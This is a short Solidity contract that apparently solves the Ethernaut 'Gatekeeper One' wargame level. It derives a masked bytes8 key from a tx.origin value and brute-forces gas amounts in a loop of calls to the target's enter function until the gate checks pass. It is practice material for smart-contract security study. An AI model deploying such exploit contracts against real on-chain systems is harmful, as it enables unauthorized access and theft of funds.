// SPDX.License.Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';
import '/GateKeeper.sol';

contract GateRaid {
    using SafeMath for uint256;
    bytes8 txoriginID = 0x74704bb989B2a4F6;
    bytes8 key = txoriginID & 0xFFFFFFFF0000FFFF;
    GatekeeperOne public gkone;

    function setGateKeeper (address _caddr) public {
        gkone = GatekeeperOne(_caddr);
    }

    function letMeIn() public{
         for (uint256 i = 0; i < 120; i++) {
         (bool result, bytes memory data) = address(gkone).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); 
          // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
      if(result)
        {
        break;
      }
    }
} 
}